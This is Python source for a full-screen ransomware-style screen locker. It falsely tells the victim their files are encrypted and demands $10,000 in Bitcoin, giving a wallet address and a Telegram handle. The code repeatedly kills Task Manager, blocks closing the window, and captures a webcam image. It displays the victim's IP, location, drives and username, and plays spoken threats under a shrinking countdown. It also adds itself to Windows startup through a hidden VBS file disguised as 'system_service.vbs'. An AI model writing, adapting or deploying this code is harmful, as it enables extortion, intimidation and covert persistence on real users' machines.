import tkinter as tk
from tkinter import font
from PIL import Image, ImageTk
import random
import threading
import os
import platform
import subprocess

# Lazy imports - bu modüller ihtiyaç duyulduğunda yüklenir (startup hızı için)
pyttsx3 = None
cv2 = None
socket_mod = None
winsound_mod = None

def _lazy_import_pyttsx3():
    global pyttsx3
    if pyttsx3 is None:
        import pyttsx3 as _p
        pyttsx3 = _p
    return pyttsx3

def _lazy_import_cv2():
    global cv2
    if cv2 is None:
        import cv2 as _c
        cv2 = _c
    return cv2

def _lazy_import_socket():
    global socket_mod
    if socket_mod is None:
        import socket
        socket_mod = socket
    return socket_mod

def _lazy_import_winsound():
    global winsound_mod
    if winsound_mod is None:
        import winsound
        winsound_mod = winsound
    return winsound_mod

# Hedef süre: 2 gün (48 saat) saniye cinsinden
REMAINING_SECONDS = 2 * 24 * 60 * 60 

BG_COLOR = "#0a0a0a"
SECRET_KEY = "fsociety"
TASKMGR_KILLER_ACTIVE = True



# ==================== FAQ ====================
def show_faq():
    faq_window = tk.Toplevel()
    faq_window.title("FAQ")
    faq_window.geometry("600x400")
    faq_window.attributes('-topmost', True)
    faq_window.configure(bg=BG_COLOR)
    
    faq_text = (
        "Q: What happened to my files?\n"
        "A: All your files have been safely encrypted.\n\n"
        "Q: How can I recover them?\n"
        "A: Send $10,000 in Bitcoin to the address on the screen.\n\n"
        "Q: I need help paying!\n"
        "A: Contact us on Telegram: @roxltc\n\n"
        "Q: Who are you?\n"
        "A: We are fsociety."
    )
    faq_label = tk.Label(faq_window, text=faq_text, fg="#00FF00", bg=BG_COLOR, font=("Courier", 14), justify=tk.LEFT)
    faq_label.pack(pady=40, padx=20)

# ==================== TTS SESLİ UYARI ====================
def speak_warning():
    try:
        engine = _lazy_import_pyttsx3().init()
        engine.setProperty('rate', 130) 
        voices = engine.getProperty('voices')
        for voice in voices:
            if "english" in voice.name.lower():
                engine.setProperty('voice', voice.id)
                break
        
        username = os.getlogin()
        engine.say(f"Hello {username}. Your system has been compromised. We are watching you. Do not restart your computer, or your key will be deleted. Pay the ransom immediately.")
        engine.runAndWait()
    except Exception as e:
        print("TTS Error:", e)

# ==================== AĞ BİLGİSİ (ASYNC) ====================
def get_network_info_async(sys_info_label, sys_frame):
    """Ağ bilgisini arka planda alır ve UI'ı günceller"""
    try:
        import urllib.request
        import json
        
        local_ip = "Unknown"
        external_ip = "Unknown"
        country = "Unknown"
        country_code = ""
        
        try:
            local_ip = _lazy_import_socket().gethostbyname(_lazy_import_socket().gethostname())
        except:
            pass
            
        try:
            req = urllib.request.Request("http://ip-api.com/json/", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            with urllib.request.urlopen(req, timeout=2) as response:
                data = json.loads(response.read().decode())
                external_ip = data.get("query", "Unknown")
                country = data.get("country", "Unknown")
                country_code = data.get("countryCode", "")
        except Exception as e:
            print("API Error:", e)
            
        drives = [f"{chr(x)}:\\" for x in range(65, 91) if os.path.exists(f"{chr(x)}:\\")]
        disk_str = " ".join(drives)

        flag_emoji = ""
        if len(country_code) == 2:
            try:
                flag_emoji = chr(ord(country_code[0]) + 127397) + chr(ord(country_code[1]) + 127397)
            except:
                flag_emoji = ""

        sys_info_text = (
            f"LOCAL IP  : {local_ip}\n"
            f"EXT IP    : {external_ip}\n"
            f"LOCATION  : {country} {flag_emoji}\n"
            f"DRIVES    : {disk_str}"
        )
        
        # UI güncellemesini ana thread'de yap
        sys_info_label.after(0, lambda: sys_info_label.config(text=sys_info_text))
    except Exception as e:
        print("Network info error:", e)

# ==================== WEBCAM YAKALAMA (ASYNC) ====================
def capture_webcam_async(left_frame, root):
    """Webcam'i arka planda yakalar ve UI'a ekler"""
    try:
        _cv2 = _lazy_import_cv2()
        cap = _cv2.VideoCapture(0)
        if not cap.isOpened():
            cap.release()
            return
        ret, frame = cap.read()
        cap.release()
        if ret:
            frame_rgb = _cv2.cvtColor(frame, _cv2.COLOR_BGR2RGB)
            pil_img = Image.fromarray(frame_rgb)
            pil_img = pil_img.resize((300, 225))
            
            # UI güncellemesini ana thread'de yap
            def update_ui():
                try:
                    webcam_photo = ImageTk.PhotoImage(pil_img)
                    root.webcam_photo = webcam_photo
                    
                    webcam_frame = tk.Frame(left_frame, bg="black", highlightbackground="#FF0000", highlightthickness=2)
                    # Logo'nun üstüne ekle (index 0)
                    webcam_frame.pack(pady=(20, 5), before=left_frame.winfo_children()[0] if left_frame.winfo_children() else None)
                    
                    webcam_label = tk.Label(webcam_frame, image=webcam_photo, bg="black")
                    webcam_label.pack(padx=2, pady=2)
                    
                    watching_label = tk.Label(left_frame, text="WE ARE WATCHING YOU", fg="#FF0000", bg=BG_COLOR, font=("Courier", 16, "bold"))
                    watching_label.pack(after=webcam_frame, pady=(0, 10))
                    blink_warning(watching_label, root)
                except:
                    pass
            
            root.after(0, update_ui)
    except Exception as e:
        print("Webcam Error:", e)

# ==================== ZAMANLAYICI ====================
def update_timer(timer_label, root):
    global REMAINING_SECONDS
    if REMAINING_SECONDS > 0:
        days = REMAINING_SECONDS // (24 * 3600)
        hours = (REMAINING_SECONDS % (24 * 3600)) // 3600
        minutes = (REMAINING_SECONDS % 3600) // 60
        seconds = REMAINING_SECONDS % 60
        
        time_str = f"{days:02d} : {hours:02d} : {minutes:02d} : {seconds:02d}"
        timer_label.config(text=time_str)
        
        REMAINING_SECONDS -= 1
        root.after(1000, update_timer, timer_label, root)
    else:
        timer_label.config(text="TIME IS UP! FILES DELETED.")

# ==================== ŞİFRE ÇÖZME ====================
def attempt_decrypt(decrypt_entry, warning_label, root):
    global REMAINING_SECONDS, TASKMGR_KILLER_ACTIVE
    key = decrypt_entry.get().strip()
    if key == "":
        return
        
    if key == SECRET_KEY:
        TASKMGR_KILLER_ACTIVE = False
        warning_label.config(text="DECRYPTION SUCCESSFUL. HAVE A NICE DAY.", fg="#00FF00")
        root.update()
        import time
        time.sleep(2)
        root.destroy()
        return

    warning_label.config(text="CHECKING KEY...", fg="yellow")
    root.update()
    
    import time
    time.sleep(1)
    
    warning_label.config(text="INVALID KEY! TIME DECREASED BY 1 HOUR!", fg="red")
    REMAINING_SECONDS = max(0, REMAINING_SECONDS - 3600)
    decrypt_entry.delete(0, tk.END)
    
    # Yanlış şifrede pencere sallama efekti
    shake_window(root)
    
    # Yanlış şifrede sesli uyarı
    threading.Thread(target=speak_wrong_key, daemon=True).start()

def speak_wrong_key():
    try:
        engine = _lazy_import_pyttsx3().init()
        engine.setProperty('rate', 150)
        voices = engine.getProperty('voices')
        for voice in voices:
            if "english" in voice.name.lower():
                engine.setProperty('voice', voice.id)
                break
        engine.say("Wrong key! Do not try to fool us!")
        engine.runAndWait()
    except:
        pass

# ==================== PENCERE SALLAMA EFEKTİ ====================
def shake_window(root, count=0):
    """Pencereyi deprem gibi sallar"""
    if count >= 20:
        # Tam ekrana geri dön
        root.attributes('-fullscreen', True)
        return
    
    # Tam ekranı kısa anlığına kaldır ki konumu değiştirebilelim
    if count == 0:
        root.attributes('-fullscreen', False)
        root.state('zoomed')
    
    x_offset = random.randint(-15, 15)
    y_offset = random.randint(-15, 15)
    
    geom = root.geometry()
    # "WxH+X+Y" formatından X ve Y'yi çıkar
    try:
        parts = geom.split('+')
        base_x = int(parts[1])
        base_y = int(parts[2])
    except:
        base_x, base_y = 0, 0
    
    root.geometry(f"+{base_x + x_offset}+{base_y + y_offset}")
    
    # Sarsıntı sırasında bip sesi
    if count % 3 == 0:
        try:
            _lazy_import_winsound().Beep(random.randint(200, 800), 50)
        except:
            pass
    
    root.after(30, shake_window, root, count + 1)

# ==================== GLİTCH EFEKTİ ====================
def glitch_effect(header_label, root):
    original_text = "ALL YOUR FILES ARE ENCRYPTED"
    if random.random() < 0.2: 
        glitch_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
        glitched_text = "".join(random.choice(glitch_chars) if random.random() < 0.3 else c for c in original_text)
        header_label.config(text=glitched_text, fg="white", bg="red")
        root.after(100, lambda: header_label.config(text=original_text, fg="#FF0000", bg=BG_COLOR))
        
    root.after(random.randint(500, 2000), glitch_effect, header_label, root)

# ==================== YANIP SÖNEN UYARI ====================
def blink_warning(label, root):
    current_color = label.cget("fg")
    next_color = "yellow" if current_color == "red" else "red"
    label.config(fg=next_color)
    root.after(500, blink_warning, label, root)

# ==================== MATRIX DİJİTAL YAĞMUR ====================
class MatrixRain:
    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.width = width
        self.height = height
        self.columns = width // 14
        self.drops = [random.randint(-height // 14, 0) for _ in range(self.columns)]
        self.chars = "abcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()アイウエオカキクケコサシスセソタチツテト"
        self.text_items = []
        
    def update(self):
        # Eski karakterleri sil
        for item in self.text_items:
            self.canvas.delete(item)
        self.text_items.clear()
        
        for i in range(self.columns):
            x = i * 14
            y = self.drops[i] * 14
            
            char = random.choice(self.chars)
            
            # Baş karakter parlak kırmızı
            item = self.canvas.create_text(x, y, text=char, fill="#FF0000", font=("Consolas", 10), anchor=tk.NW)
            self.text_items.append(item)
            
            # İz bırakan karakterler (soluk kırmızı/koyu kırmızı)
            for j in range(1, 8):
                trail_y = y - j * 14
                if trail_y > 0:
                    trail_char = random.choice(self.chars)
                    alpha_colors = ["#CC0000", "#990000", "#660000", "#440000", "#330000", "#220000", "#110000"]
                    color = alpha_colors[min(j - 1, len(alpha_colors) - 1)]
                    trail_item = self.canvas.create_text(x, trail_y, text=trail_char, fill=color, font=("Consolas", 10), anchor=tk.NW)
                    self.text_items.append(trail_item)
            
            self.drops[i] += 1
            
            if y > self.height and random.random() > 0.95:
                self.drops[i] = 0
        
        self.canvas.after(80, self.update)

# ==================== GÖREV YÖNETİCİSİ KATİLİ ====================
def kill_task_manager():
    """Görev yöneticisini sürekli kapatır"""
    while TASKMGR_KILLER_ACTIVE:
        try:
            subprocess.run(["taskkill", "/f", "/im", "Taskmgr.exe"], 
                         capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        import time
        time.sleep(0.5)

# ==================== RAHATSIZ EDİCİ SİSTEM SESLERİ ====================
def creepy_beeps():
    """Rastgele aralıklarla rahatsız edici bip sesleri çalar"""
    while TASKMGR_KILLER_ACTIVE:
        import time
        time.sleep(random.randint(8, 20))
        if not TASKMGR_KILLER_ACTIVE:
            break
        try:
            # Düşük frekanslı uğursuz bip
            freq = random.choice([150, 200, 250, 300, 100])
            duration = random.choice([100, 200, 300, 500])
            _lazy_import_winsound().Beep(freq, duration)
        except:
            pass

# ==================== LOGO ASYNC YÜKLEME ====================
def load_logo_async(left_frame, root):
    """Logo'yu arka planda yükler"""
    try:
        # Kodun çalıştığı mevcut dizini bulur ve assets/logo.png yolunu oluşturur
        current_dir = os.path.dirname(os.path.abspath(__file__))
        img_path = os.path.join(current_dir, "assets", "logo.png")
        
        pil_image = Image.open(img_path)
        pil_image = pil_image.resize((350, 350))
        
        def update_ui():
            try:
                logo_img = ImageTk.PhotoImage(pil_image)
                root.logo_img = logo_img
                logo_label = tk.Label(left_frame, image=logo_img, bg=BG_COLOR)
                logo_label.pack(pady=(10, 10))
            except:
                pass
        
        root.after(0, update_ui)
    except Exception as e:
        print("Logo error:", e)
# ==================== ANA EKRAN ====================
def create_black_screen():
    global TASKMGR_KILLER_ACTIVE
    
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg=BG_COLOR)
    
    # Alt+F4 ve diğer kapatma yöntemlerini tamamen devre dışı bırak
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    root.bind("<Escape>", lambda e: root.destroy())
    root.config(cursor="X_cursor")
    
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    
    # ==================== MATRIX ARKA PLAN ====================
    matrix_canvas = tk.Canvas(root, bg=BG_COLOR, highlightthickness=0, width=screen_width, height=screen_height)
    matrix_canvas.place(x=0, y=0, relwidth=1, relheight=1)
    
    matrix_rain = MatrixRain(matrix_canvas, screen_width, screen_height)
    matrix_rain.update()
    
    # ==================== FONTLAR ====================
    h1_font = font.Font(family="Courier", size=40, weight="bold")
    h2_font = font.Font(family="Courier", size=18, weight="bold")
    p_font = font.Font(family="Courier", size=13)
    timer_font = font.Font(family="Courier", size=40, weight="bold")
    btc_font = font.Font(family="Courier", size=14, weight="bold")
    sys_font = font.Font(family="Consolas", size=11, weight="bold")
    
    # ==================== ANA KAPSAYICI (Matrix'in üstünde) ====================
    main_container = tk.Frame(root, bg=BG_COLOR)
    main_container.place(relx=0.5, rely=0.5, anchor=tk.CENTER)
    
    left_frame = tk.Frame(main_container, bg=BG_COLOR)
    left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=40)
    
    right_frame = tk.Frame(main_container, bg=BG_COLOR)
    right_frame.pack(side=tk.LEFT, fill=tk.BOTH, padx=40)

    # ==================== AĞ BİLGİSİ (placeholder + async yükleme) ====================
    sys_frame = tk.Frame(left_frame, bg="black", highlightbackground="#00FF00", highlightthickness=1, padx=10, pady=8)
    sys_frame.pack(fill=tk.X, pady=(20, 10))
    
    # Placeholder göster, gerçek veri arka planda gelecek
    placeholder_text = (
        "LOCAL IP  : Loading...\n"
        "EXT IP    : Loading...\n"
        "LOCATION  : Loading...\n"
        "DRIVES    : Loading..."
    )
    sys_info_label = tk.Label(sys_frame, text=placeholder_text, fg="#00FF00", bg="black", font=sys_font, justify=tk.LEFT)
    sys_info_label.pack(anchor=tk.W)
    
    # Ağ bilgisini arka planda al
    threading.Thread(target=get_network_info_async, args=(sys_info_label, sys_frame), daemon=True).start()
    
    username = os.getlogin()
    os_name = f"{platform.system()} {platform.release()}"
    personal_label = tk.Label(left_frame, text=f"USER: {username.upper()}\nOS: {os_name}", fg="white", bg=BG_COLOR, font=("Courier", 11, "bold"))
    personal_label.pack(pady=(0, 10))

    # FAQ Butonu
    faq_button = tk.Button(left_frame, text="READ FAQ", command=show_faq, font=("Courier", 13, "bold"), bg="#333333", fg="white", cursor="hand2", relief=tk.FLAT)
    faq_button.pack(pady=10)

    # ==================== WEBCAM ASYNC YÜKLEME ====================
    threading.Thread(target=capture_webcam_async, args=(left_frame, root), daemon=True).start()

    # ==================== LOGO ASYNC YÜKLEME ====================
    threading.Thread(target=load_logo_async, args=(left_frame, root), daemon=True).start()

    # ==================== SAĞ PANEL ====================
    header_label = tk.Label(right_frame, text="ALL YOUR FILES ARE ENCRYPTED", fg="#FF0000", bg=BG_COLOR, font=h1_font)
    header_label.pack(pady=(20, 10))
    
    info_text = (
        f"Hello {username}. We have infiltrated your {os_name} system.\n"
        "Your documents, photos, databases, and other important files\n"
        "have been encrypted with military-grade AES-256 encryption.\n\n"
        "The only way to recover your files is to purchase the private\n"
        "decryption key. If you do not pay, the key will be destroyed."
    )
    info_label = tk.Label(right_frame, text=info_text, fg="white", bg=BG_COLOR, font=p_font, justify=tk.CENTER)
    info_label.pack(pady=8)
    
    # Kapatmama tehdidi
    threat_label = tk.Label(right_frame, text="⚠ DO NOT TURN OFF OR RESTART YOUR COMPUTER! ⚠\nYOUR DECRYPTION KEY WILL BE PERMANENTLY DELETED.", fg="red", bg=BG_COLOR, font=("Courier", 13, "bold"))
    threat_label.pack(pady=5)
    blink_warning(threat_label, root)

    # ==================== GERİ SAYIM ====================
    timer_frame = tk.Frame(right_frame, bg=BG_COLOR, highlightbackground="#FF0000", highlightthickness=2, padx=25, pady=8)
    timer_frame.pack(pady=8)
    
    timer_title = tk.Label(timer_frame, text="TIME REMAINING BEFORE DELETION:", fg="white", bg=BG_COLOR, font=h2_font)
    timer_title.pack(pady=(0, 5))
    timer_label = tk.Label(timer_frame, text="00 : 00 : 00 : 00", fg="#FF0000", bg=BG_COLOR, font=timer_font)
    timer_label.pack()
    
    labels_frame = tk.Frame(timer_frame, bg=BG_COLOR)
    labels_frame.pack(fill=tk.X, pady=(5, 0))
    tk.Label(labels_frame, text="DAYS", fg="#777777", bg=BG_COLOR, font=p_font).pack(side=tk.LEFT, expand=True)
    tk.Label(labels_frame, text="HOURS", fg="#777777", bg=BG_COLOR, font=p_font).pack(side=tk.LEFT, expand=True)
    tk.Label(labels_frame, text="MINUTES", fg="#777777", bg=BG_COLOR, font=p_font).pack(side=tk.LEFT, expand=True)
    tk.Label(labels_frame, text="SECONDS", fg="#777777", bg=BG_COLOR, font=p_font).pack(side=tk.LEFT, expand=True)

    # ==================== ÖDEME ====================
    payment_frame = tk.Frame(right_frame, bg=BG_COLOR)
    payment_frame.pack(pady=8)
    payment_info = tk.Label(payment_frame, text="SEND $10,000 USD TO THE FOLLOWING BITCOIN ADDRESS:", fg="#FFFF00", bg=BG_COLOR, font=h2_font)
    payment_info.pack(pady=(0, 5))
    btc_address_entry = tk.Entry(payment_frame, font=btc_font, fg="#00FF00", bg="#222222", width=45, justify=tk.CENTER, readonlybackground=BG_COLOR)
    btc_address_entry.insert(0, "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")
    btc_address_entry.config(state='readonly')
    btc_address_entry.pack(pady=5)

    # ==================== ŞİFRE GİRİŞİ ====================
    decrypt_frame = tk.Frame(right_frame, bg=BG_COLOR, pady=8)
    decrypt_frame.pack()
    tk.Label(decrypt_frame, text="ENTER DECRYPTION KEY:", fg="white", bg=BG_COLOR, font=p_font).pack(side=tk.LEFT, padx=5)
    decrypt_entry = tk.Entry(decrypt_frame, font=("Courier", 14), width=20, bg="#222222", fg="white", insertbackground="white")
    decrypt_entry.pack(side=tk.LEFT, padx=5)
    decrypt_btn = tk.Button(decrypt_frame, text="DECRYPT", font=("Courier", 13, "bold"), bg="#333333", fg="white", cursor="hand2", 
                            command=lambda: attempt_decrypt(decrypt_entry, warning_label, root))
    decrypt_btn.pack(side=tk.LEFT, padx=5)
    warning_label = tk.Label(right_frame, text="", fg="red", bg=BG_COLOR, font=("Courier", 12, "bold"))
    warning_label.pack(pady=8)

    # Telegram İletişim Bilgisi
    contact_label = tk.Label(right_frame, text="CONTACT SUPPORT: Telegram @roxltc", fg="#00FFFF", bg=BG_COLOR, font=("Courier", 13, "bold"))
    contact_label.pack(pady=(0, 10))

    # ==================== ARKA PLAN GÖREVLERİ ====================
    update_timer(timer_label, root)
    glitch_effect(header_label, root)
    
    # Sesli uyarı (zaten thread'de)
    threading.Thread(target=speak_warning, daemon=True).start()
    
    # Görev Yöneticisi katili
    threading.Thread(target=kill_task_manager, daemon=True).start()
    
    # Rahatsız edici bip sesleri
    threading.Thread(target=creepy_beeps, daemon=True).start()

    root.mainloop()

# ==================== STARTUP'A EKLEME (VBS ile hızlı sessiz başlatma) ====================
def add_to_startup():
    """Kendini Windows kullanıcı başlangıç klasörüne VBS ile ekler (daha hızlı başlar)"""
    try:
        startup_folder = os.path.join(
            os.environ["APPDATA"],
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        
        script_path = os.path.abspath(__file__)
        vbs_path = os.path.join(startup_folder, "system_service.vbs")
        bat_path = os.path.join(startup_folder, "system_service.bat")
        
        # Eski .bat dosyasını sil (varsa)
        if os.path.exists(bat_path):
            try:
                os.remove(bat_path)
            except:
                pass
        
        # Zaten VBS eklenmişse tekrar ekleme
        if os.path.exists(vbs_path):
            return
        
        # .vbs dosyası oluştur (pencere göstermez + .bat'tan daha hızlı başlar)
        vbs_content = (
            f'Set WshShell = CreateObject("WScript.Shell")\n'
            f'WshShell.Run "pythonw ""{script_path}""", 0, False\n'
            f'Set WshShell = Nothing\n'
        )
        
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
            
    except Exception as e:
        print("Startup Error:", e)

if __name__ == "__main__":
    add_to_startup()
    create_black_screen()
